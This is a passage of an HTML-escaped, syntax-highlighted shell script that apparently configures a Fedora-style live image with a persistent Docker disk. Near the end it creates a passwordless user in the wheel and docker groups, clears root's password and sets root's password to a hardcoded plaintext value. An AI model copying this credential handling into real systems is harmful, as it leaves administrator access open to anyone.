/.liveimg-configured ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003econfigdone\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexists() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\\$*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Make sure we don\u0026#39;t mangle the hardware clock on shutdown\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eln -sf /dev/null /etc/systemd/system/hwclock-save.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elivedir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;LiveOS\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor arg in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${arg##rd.live.dir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    livedir=\\${arg##rd.live.dir=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  if [ \u0026#34;\\${arg##live_dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    livedir=\\${arg##live_dir=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable swaps unless requested otherwise\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eswaps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\\`blkid -t TYPE=swap -o device\\`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -n \u0026#34;\\$swaps\u0026#34; ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003efor s in \\$swaps ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eaction \u0026#34;Enabling swap partition \\$s\u0026#34; swapon \\$s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -f /run/initramfs/live/\\${livedir}/swap.img ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eaction \u0026#34;Enabling swap file\u0026#34; swapon /run/initramfs/live/\\${livedir}/swap.img\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emountDockerDisk() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# support label/uuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${dockerdev##LABEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; -o \u0026#34;\\${dockerdev##UUID=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=\\`/sbin/blkid -o device -t \u0026#34;\\$dockerdev\u0026#34;\\`\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if we\u0026#39;re given a file rather than a blockdev, loopback it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${dockerdev##mtd}\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    # mtd devs don\u0026#39;t have a block device but get magic-mounted with -t jffs2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    mountopts=\u0026#34;-t jffs2\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  elif [ ! -b \u0026#34;\\$dockerdev\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    loopdev=\\`losetup -f\\`\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    if [ \u0026#34;\\${dockerdev##/run/initramfs/live}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      action \u0026#34;Remounting live store r/w\u0026#34; mount -o remount,rw /run/initramfs/live\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    losetup \\$loopdev \\$dockerdev\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=\\$loopdev\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if it\u0026#39;s encrypted, we need to unlock it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ \u0026#34;\\$(/sbin/blkid -s TYPE -o value \\$dockerdev 2\u0026gt;/dev/null)\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;crypto_LUKS\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    echo\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    echo \u0026#34;Setting up encrypted Docker device\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    plymouth ask-for-password --command=\u0026#34;cryptsetup luksOpen \\$dockerdev EncDocker\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    dockerdev=/dev/mapper/EncDocker\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# and finally do the mount\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emount \\$mountopts \\$dockerdev /var/lib/docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# if we have /home under what\u0026#39;s passed for persistent home, then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# we should make that the real /home.  useful for mtd device on olpc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eif [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e[ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/lib/docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efindDockerDisk() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003efor arg in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eif [ \u0026#34;\\${arg##dockerdisk\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      dockerdev=\\${arg##dockerdisk=}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      return\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  done\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; dockerdisk\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  findDockerDisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eelif [ -e /run/initramfs/live/\\${livedir}/docker.img ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edockerdev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e/run/initramfs/live/\\${livedir}/docker.img\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if we have a persistent /home, then we want to go ahead and mount it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; nodockerdisk \u0026amp;\u0026amp; [ -n \u0026#34;\\$dockerdev\u0026#34; ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eaction \u0026#34;Mounting persistent /var/lib/docker\u0026#34; mountDockerDisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make it so that we don\u0026#39;t do writing to the overlay for things which\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# are just tmpdirs/caches\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emount -t tmpfs -o mode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e0755 varcacheyum /var/cache/yum\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emount -t tmpfs vartmp /var/tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e[ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/cache/yum /var/tmp \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -n \u0026#34;\\$configdone\u0026#34; ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eexit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add fedora user with no passwd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eaction \u0026#34;Adding live user\u0026#34; useradd \\$USERADDARGS -c \u0026#34;Live System User\u0026#34; liveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epasswd -d liveuser \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eusermod -aG wheel,docker liveuser \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Remove root password lock\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epasswd -d root \u0026gt; /dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e(echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off firstboot for livecd boots\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable firstboot-text.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable firstboot-graphical.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop firstboot-text.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop firstboot-graphical.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t use prelink on a running live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esed -i \u0026#39;s/PRELINKING\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eyes/PRELINKING=no/\u0026#39; /etc/sysconfig/prelink \u0026amp;\u0026gt;/dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off mdmonitor by default\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable mdmonitor.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable mdmonitor-takeover.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop mdmonitor.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop mdmonitor-takeover.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t enable the gnome-settings-daemon packagekit plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egsettings set org.gnome.settings-daemon.plugins.updates active \u0026#39;false\u0026#39; || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# don\u0026#39;t start cron/at as they tend to spawn things which are\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# disk intensive that are painful on a live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable crond.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl --no-reload disable atd.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop crond.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop atd.service 2\u0026gt; /dev/null || :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Mark things as configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etouch /.liveimg-configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add static hostname to work around xauth bug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# https://bugzilla.redhat.com/show_bug.cgi?id=679486\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;localhost\u0026#34; \u0026gt; /etc/hostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fixing the lang install issue when other lang than English is selected . See 